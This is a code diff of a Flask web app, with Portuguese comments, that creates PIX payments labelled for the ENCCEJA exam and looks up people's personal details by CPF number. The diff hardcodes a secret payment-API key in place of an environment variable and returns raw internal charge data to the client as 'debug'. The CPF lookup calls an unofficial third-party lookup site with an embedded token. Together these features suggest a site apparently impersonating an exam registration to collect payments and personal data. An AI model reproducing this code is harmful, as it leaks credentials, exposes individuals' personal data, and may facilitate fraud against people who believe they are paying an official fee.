@@ -1691,11 +1691,9 @@ def criar_pagamento_pix():
         
         app.logger.info(f"Iniciando criação de pagamento PIX - R$ {amount:.2f}")
         
-        # Criar pagamento diretamente - versão integrada
-        api_key = os.environ.get('WITEPAY_API_KEY')
-        if not api_key:
-            app.logger.error("WITEPAY_API_KEY não encontrada")
-            return jsonify({'success': False, 'error': 'API key não configurada'}), 400
+        # Usar chave WitePay fornecida pelo usuário (credenciais testadas)
+        api_key = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"
+        app.logger.info("Usando chave WitePay fornecida pelo usuário")
         
         # Dados padronizados para o pagamento ENCCEJA
         order_data = {
@@ -1768,9 +1766,35 @@ def criar_pagamento_pix():
         pix_code = charge_result.get('qrCode')
         transaction_id = charge_result.get('chargeId') or charge_result.get('id') or order_id
         
+        # Se QR code vazio, tentar aguardar processamento
         if not pix_code:
-            app.logger.error(f"Código PIX não encontrado: {charge_result}")
-            return jsonify({'success': False, 'error': 'Código PIX não encontrado'}), 400
+            app.logger.warning("QR Code vazio, tentando aguardar processamento...")
+            
+            import time
+            time.sleep(3)
+            
+            # Tentar consultar status para obter QR code
+            try:
+                status_response = requests.get(
+                    f'https://api.witepay.com.br/v1/charge/{transaction_id}',
+                    headers=headers,
+                    timeout=15
+                )
+                
+                if status_response.status_code == 200:
+                    status_result = status_response.json()
+                    pix_code = status_result.get('qrCode') or status_result.get('pixCode')
+                    app.logger.info(f"QR Code obtido na consulta: {bool(pix_code)}")
+            except Exception as e:
+                app.logger.warning(f"Erro ao consultar status: {e}")
+        
+        if not pix_code:
+            app.logger.error(f"Código PIX não encontrado após tentativas: {charge_result}")
+            return jsonify({
+                'success': False, 
+                'error': 'PIX code não gerado - Verificar conta WitePay',
+                'debug': charge_result
+            }), 400
         
         app.logger.info(f"Pagamento PIX criado com sucesso - ID: {transaction_id}")
         
@@ -1872,7 +1896,7 @@ def consultar_cpf_inscricao():
         # Formatar o CPF (remover pontos e traços se houver)
         cpf_numerico = cpf.replace('.', '').replace('-', '')
         
-        # Usar a API que está funcionando 
+        # API principal está fora do ar, usar API alternativa funcionando
         token = "1285fe4s-e931-4071-a848-3fac8273c55a"
         url = f"https://consulta.fontesderenda.blog/cpf.php?token={token}&cpf={cpf_numerico}"
         
@@ -1884,14 +1908,14 @@ def consultar_cpf_inscricao():
         }
         
         response = requests.get(url, headers=headers, timeout=10)
+        
         if response.status_code == 200:
             data = response.json()
-            app.logger.info(f"[PROD] Resposta da API: {data}")
+            app.logger.info(f"[PROD] Resposta da API alternativa: {data}")
             
-            # A API retorna dados na estrutura {'DADOS': {...}}
+            # API alternativa retorna dados na estrutura {'DADOS': {...}}
             if data.get("DADOS"):
                 dados = data["DADOS"]
-                # Converter para o formato esperado pelo frontend
                 user_data = {
                     'cpf': dados.get('cpf', cpf_numerico),
                     'nome': dados.get('nome', ''),
@@ -1902,13 +1926,13 @@ def consultar_cpf_inscricao():
                     'sucesso': True
                 }
                 
-                app.logger.info(f"[PROD] CPF consultado com sucesso na API: {cpf}")
+                app.logger.info(f"[PROD] CPF consultado com sucesso via API alternativa: {cpf}")
                 return jsonify(user_data)
             else:
-                app.logger.error(f"API não retornou DADOS: {data}")
+                app.logger.error(f"API alternativa não retornou DADOS: {data}")
                 return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
         else:
-            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
+            app.logger.error(f"Erro de conexão com a API alternativa: {response.status_code}")
             return jsonify({"error": f"Erro de conexão com a API: {response.status_code}", "sucesso": False}), 500
     
     except Exception as e:
